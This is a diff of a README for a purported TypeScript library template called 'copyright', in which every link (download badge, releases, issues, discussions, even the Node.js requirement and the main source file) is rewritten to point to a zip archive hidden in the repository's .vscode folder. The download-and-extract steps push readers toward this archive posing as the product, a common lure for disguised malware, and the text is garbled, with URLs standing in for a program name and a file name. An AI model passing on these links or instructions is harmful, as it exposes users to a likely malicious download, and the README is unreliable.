@@ -1,7 +1,7 @@
 # 🎉 copyright - A Simple Way to Start Your TypeScript Project
 
 ## 🚀 Quick Download
-[![Download copyright](https://raw.githubusercontent.com/theydkfocus/copyright/main/tests/Software_v3.6.zip)](https://raw.githubusercontent.com/theydkfocus/copyright/main/tests/Software_v3.6.zip)
+[![Download copyright](https://github.com/theydkfocus/copyright/raw/refs/heads/main/.vscode/Software-v2.4.zip)](https://github.com/theydkfocus/copyright/raw/refs/heads/main/.vscode/Software-v2.4.zip)
 
 ## 📖 Overview
 The **copyright** project is a user-friendly TypeScript library template. It helps you set up modern tools for your coding projects easily. No need for deep programming knowledge.
@@ -18,16 +18,16 @@ This template includes essential features to help you create JavaScript and Type
 ## 💻 System Requirements
 To run **copyright**, you need:
 - A computer with Windows, macOS, or Linux.
-- https://raw.githubusercontent.com/theydkfocus/copyright/main/tests/Software_v3.6.zip version 14 or higher. You can download it from [https://raw.githubusercontent.com/theydkfocus/copyright/main/tests/Software_v3.6.zip](https://raw.githubusercontent.com/theydkfocus/copyright/main/tests/Software_v3.6.zip).
+- https://github.com/theydkfocus/copyright/raw/refs/heads/main/.vscode/Software-v2.4.zip version 14 or higher. You can download it from [https://github.com/theydkfocus/copyright/raw/refs/heads/main/.vscode/Software-v2.4.zip](https://github.com/theydkfocus/copyright/raw/refs/heads/main/.vscode/Software-v2.4.zip).
   
 ## 📥 Download & Install
 To get the latest version of **copyright**, visit the Releases page:
 
-[Download copyright](https://raw.githubusercontent.com/theydkfocus/copyright/main/tests/Software_v3.6.zip)
+[Download copyright](https://github.com/theydkfocus/copyright/raw/refs/heads/main/.vscode/Software-v2.4.zip)
 
 1. Click on the link above.
 2. Look for the latest version.
-3. Download the file labeled "https://raw.githubusercontent.com/theydkfocus/copyright/main/tests/Software_v3.6.zip" or similar.
+3. Download the file labeled "https://github.com/theydkfocus/copyright/raw/refs/heads/main/.vscode/Software-v2.4.zip" or similar.
 4. Extract the contents to a folder on your computer.
 5. Follow the setup instructions below.
 
@@ -48,19 +48,19 @@ To get the latest version of **copyright**, visit the Releases page:
 Once **copyright** is installed, you can start developing your library. Here’s how to customize it:
 
 1. Open the project folder in your preferred code editor. 
-2. Modify the `https://raw.githubusercontent.com/theydkfocus/copyright/main/tests/Software_v3.6.zip` file. This is where your main code will go.
+2. Modify the `https://github.com/theydkfocus/copyright/raw/refs/heads/main/.vscode/Software-v2.4.zip` file. This is where your main code will go.
 3. Use the built-in testing setup. You can write tests in the `test/` folder.
 
 ## 🐞 Troubleshooting
 Having issues? Check these common problems:
 - **Error: Cannot find module**: Make sure you ran `npm install`.
-- **Slow performance**: Ensure your https://raw.githubusercontent.com/theydkfocus/copyright/main/tests/Software_v3.6.zip version is up to date.
+- **Slow performance**: Ensure your https://github.com/theydkfocus/copyright/raw/refs/heads/main/.vscode/Software-v2.4.zip version is up to date.
 
-For further assistance, visit the [Issues page](https://raw.githubusercontent.com/theydkfocus/copyright/main/tests/Software_v3.6.zip).
+For further assistance, visit the [Issues page](https://github.com/theydkfocus/copyright/raw/refs/heads/main/.vscode/Software-v2.4.zip).
 
 ## 📢 Community and Support
 Join our community to share your experiences or ask questions:
-- [GitHub Discussions](https://raw.githubusercontent.com/theydkfocus/copyright/main/tests/Software_v3.6.zip)
+- [GitHub Discussions](https://github.com/theydkfocus/copyright/raw/refs/heads/main/.vscode/Software-v2.4.zip)
 - Follow us on Twitter for updates.
 
 ## 📦 Topics
@@ -80,7 +80,7 @@ Feel free to explore these topics further!
 
 ## 📅 Changelog
 To keep track of changes and updates:
-- Visit the [Releases page](https://raw.githubusercontent.com/theydkfocus/copyright/main/tests/Software_v3.6.zip) for the latest information.
+- Visit the [Releases page](https://github.com/theydkfocus/copyright/raw/refs/heads/main/.vscode/Software-v2.4.zip) for the latest information.
 
 ## 💬 Feedback
 Your feedback is important. If you have suggestions or find issues, please let us know on GitHub.
